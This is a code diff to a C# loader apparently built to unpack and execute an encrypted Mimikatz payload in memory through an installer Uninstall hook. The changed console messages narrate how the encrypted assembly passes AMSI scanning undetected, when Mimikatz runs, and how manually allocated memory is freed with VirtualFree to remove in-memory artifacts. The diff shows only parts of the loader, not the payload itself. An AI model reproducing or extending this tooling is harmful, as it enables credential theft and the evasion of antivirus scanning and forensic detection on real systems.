@@ -48,7 +48,6 @@ namespace KatzAssembly
         //The Methods can be Uninstall/Install.  Install is transactional, and really unnecessary.
         public override void Uninstall(System.Collections.IDictionary savedState)
         {
-
             Console.WriteLine("Hello There From Uninstall");
             try
             {
@@ -59,9 +58,7 @@ namespace KatzAssembly
                 Console.WriteLine(ex.Message);
                 Console.ReadLine();
             }
-
         }
-
     }
 
     public static class Katz
@@ -78,7 +75,10 @@ namespace KatzAssembly
         {
 
             AllocConsole();
-            Console.WriteLine("Ready for unpack and execute, stay clear too, because payload not decrypted :-)");
+            Console.WriteLine("So, GC now allocated AppDomain, Assembly and Module in memory");
+            Console.WriteLine("Now our AppDomain, Assembly and Module where scanned via AMSI, but no any detections. Why?");
+            Console.WriteLine("Memory stay clear too, because Mimikatz payload, that contains in assembly, are encrypted  :-)");
+            Console.WriteLine("Ready for unpack and execute\nEntering red zone - lots of detecable artifacts\n[press enter to unpack & execute Mimikatz]", Console.ForegroundColor = ConsoleColor.Red );
             Console.ReadLine();
             byte[] unpacked = null;
             try
@@ -317,13 +317,13 @@ namespace KatzAssembly
             });
             t.Wait();
             t.Dispose();
-            Console.WriteLine("Thread Complete, lots of artifacts");
+            Console.WriteLine("Mimikatz Thread Complete, still lots of artifacts, including unsafe (\"manually\") allocated memory\n[enter to clear unsafe allocated memory]");
             Console.ReadLine();
 
             NativeDeclarations.VirtualFree(codebase, 0, NativeDeclarations.FreeType.Release);
             
             Console.WriteLine("We just freed memory, that allocated manually.");
-            Console.WriteLine("We MUST clear memory that was allocated manually, to remove inmemory artifacts");
+            Console.WriteLine("Now only safe allocated (GC) AppDomain, Assembly and Module artifacts are in memory\n[enter to finish execution and leave AppDomain, Assembly and Module]");
             Console.ReadLine();
 
         } //End Main
